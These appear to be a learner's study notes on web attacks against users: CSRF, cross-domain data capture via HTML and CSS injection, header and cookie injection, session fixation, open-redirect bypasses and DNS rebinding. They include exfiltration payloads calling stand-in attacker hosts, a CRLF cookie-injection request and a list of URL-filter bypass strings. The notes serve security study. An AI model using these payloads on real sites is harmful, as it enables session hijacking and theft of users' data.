# Attacking Users: Other Techniques
# Inducing User Actions:

# Request Forgery
- in this type of attack, attacker does not need to know the session token of the victim, he just visit some website, the malicious website initiate request for victim and without knowing of user, the changes had been done in their logged in session

## On-site Request forgery (OSRF)

## Cross-Site-Request-Forgery (CSRF)
### Exploiting CSRF Flow
#### HACK STEP
  1. Review the Key functionality within the application, as identified in application mapping exercise
  2. Find an application function that can be used to perform some sensitive action on behalf of an unwitting user, that relies solely on cookies for tracking user session, and that employes request parameter that an attacker can fully determine in advance , that is, that do not contain any other token or unpredictable items
  3. Create HTML page that issues the desired request without any user interaction, For `Request` we place `<img>` tag with `SRC` attribute set to the vulnerable URL, for `POST` request we can create  a form that contains hidden fields for all the relevent parameters required for the attack and that has its target set to the vulnerability URL,we use JavaScript for Auto submit the form

### Authentication and CSRF

# Capturing Data Cross-Domain (CORS)
- malicious website can read the response of other website that victim have accessed

## Capturing Data By injecting HTML
- if attacker found HTMLI, he craft injection liket
- `<img src='https://atacker.com/capture?html=` and dont close tag, so if this reflected in response, the other response of the user that may contain sensitive info, is got to attacker application, until valid closing `'` not found.

## Capturing Data by CSS 
- `{}*{font-family:'` payload that we send
- some browsers allow response to be loaded as CSS stylesheet and happily process any CSS definitions 
- since to exploit this behavior we need to host the CSS file in our server and make request to them
- attacker host following file
```css
<link rel=”stylesheet” href=”https://wahh-mail.com/inbox” type=”text/
css”>
<script>
document.write(‘<img src=”http://mdattacker.net/capture?’ +
escape(document.body.currentStyle.fontFamily) + ‘”>’);
</script>
```

# Other Client side Vulnerabilities
## HTTP Header Injection
`probe using new line char '%0a' and '%0d' and addsome value so it may be returned in the respone of the application `

### Injecting Cookies
- construct URL that set arbitrary cookie within the browser of any user who request it
```js
GET /settings/12/Default.aspx?Language=English%0d%0aSet-
Cookie:+SessId%3d120a12f98e8; HTTP/1.1
Host: mdsec.net

HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Set-Cookie: SessId=120a12f98e8;
```

## Session Fixation
1. attacker request login and is issued a session token
2. attacker feeds the session token to user
3. user logs in using token and received from the attacker 
4. attacker hijack user's session using the same token as the user

## OPEN Redirection Vuln
- it arise when application use user input to redirect to its application
### Finding and Exploiting Open Redirection 
- HTTP 3XX  and Location header specifying target of redirect
- HTTP `Refresh` header can be used to reload page with arbitrary URL after a Fixed interval, which may be `0` to trigger immediate redirect
	- `Refresh: 0; url=http://hello.com`
- HTML `<meta>` tag can be used  to replicate the behavior of any HTTP header 
	- `<meta http-equiv="refresh" content="0; url=http://hello.com">`
- various APi within JS `document.location='http://hello.com';`

### Blocking of Absolute URLs
- application may check whether user-supplied string start with `http://` and ifso, block the request.
- Bypass
```js
- HtTp://mdattacker.net
- %00http://mdattacker.net
- http://mdattacker.net
- //mdattacker.net
- %68%74%74%70%3a%2f%2fmdattacker.net
- %2568%2574%2574%2570%253a%252f%252fmdattacker.net
- https://mdattacker.net
- http:\\mdattacker.net
- http:///mdattacker.net
- http://http://mdattacker.net
- http://mdattacker.net/http://mdattacker.net
- hthttp://tp://mdattacker.net
- http://mdsec.net.mdattacker.net
- http://mdattacker.net/?http://mdsec.net
- http://mdattacker.net/%23http://mdsec.net
```


# Attacking Browsers
- the browser hacker's handbook

# DNS Rebinding
- technique that can be used to perform a partial breach of same-Origin restrictions in some situations, enabling a malicious website ti interact with a different domain.
- the attack works as follow
	- The user visits a malicious web page on the attacker’s domain. To retrieve this page, the user’s browser resolves the attacker’s domain name to the attacker’s IP address.
	- The attacker’s web page makes Ajax requests back to the attacker’s domain, which is allowed by the same-origin policy. The attacker uses DNS rebinding to cause the browser to resolve the attacker’s domain a second time, and this time the domain name resolves to the IP address of a third-party application, which the attacker is targeting.
	-  Subsequent requests to the attacker’s domain name are sent to the targeted application. Since these are on the same domain as the attacker’s original page, the same-origin policy allows the attacker’s script to retrieve the contents of the responses from the targeted application and send these back to the attacker, possibly on a different attacker controlled domain.




